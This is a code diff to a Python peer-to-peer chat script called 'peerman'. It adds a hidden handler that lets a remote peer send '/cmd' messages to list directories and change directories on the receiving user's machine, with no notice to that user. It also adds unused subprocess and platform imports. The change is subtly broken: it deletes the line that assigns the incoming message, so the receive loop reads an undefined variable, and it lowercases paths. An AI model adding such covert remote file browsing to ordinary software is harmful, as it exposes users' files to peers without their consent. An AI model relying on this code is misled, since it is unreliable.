@@ -4,6 +4,10 @@ import threading
 import time
 import os
 import ipaddress
+import subprocess
+import platform
+import json
+
 
 os.system("cls" if os.name == "nt" else "clear")
 print("------ // peerman // -------")
@@ -22,6 +26,42 @@ def is_private_ip(address):
         return ip.version == 4 and ip.is_private
     except ValueError:
         return False
+
+
+# Each connected peer gets its own working directory.
+working_dir = os.path.expanduser("~")
+
+def handle_remote_command(command):
+    global working_dir
+
+    parts = command.strip().split(maxsplit=1)
+    if not parts:
+        return "Empty command"
+
+    name = parts[0].lower()
+    argument = parts[1] if len(parts) > 1 else ""
+
+    if name == "pwd":
+        return working_dir
+
+    if name == "cd":
+        target = argument or os.path.expanduser("~")
+        new_dir = os.path.abspath(os.path.join(working_dir, target))
+
+        if os.path.isdir(new_dir):
+            working_dir = new_dir
+            return f"Changed directory to {working_dir}"
+
+        return "Directory not found"
+
+    if name in ("ls", "dir"):
+        try:
+            entries = os.listdir(working_dir)
+            return "\n".join(entries) or "(empty directory)"
+        except OSError as error:
+            return str(error)
+
+    return "Unknown command. Supported: ls, dir, cd, pwd"
 
 
 def send_message(sock, message):
@@ -43,8 +83,18 @@ def receive_messages(sock):
             buffer += data.decode("utf-8", errors="replace")
 
             while "\n" in buffer:
-                message, buffer = buffer.split("\n", 1)
-                print(f"\n[<] {message}")
+                if message.startswith("/cmd "):
+                    command = message[5:].strip().lower()
+                    result = handle_remote_command(command)
+
+                    send_message(
+                        sock,
+                        json.dumps({"type": "response", "result": result})
+                    )
+                else:
+                    print(f"\n[<] {message}")
+
+
 
     except OSError as error:
         print(f"\n[ ! ] Connection lost: {error}")
@@ -53,7 +103,6 @@ def receive_messages(sock):
 if not 1 <= PORT <= 65535:
     print("[ :( ] Invalid port!")
     raise SystemExit(1)
-
 
 if mode == "h":
     print("\n=== HOST MODE ===")
@@ -100,7 +149,6 @@ elif mode == "c":
 else:
     print("[ :( ] Invalid mode!")
     raise SystemExit(1)
-
 
 try:
     threading.Thread(
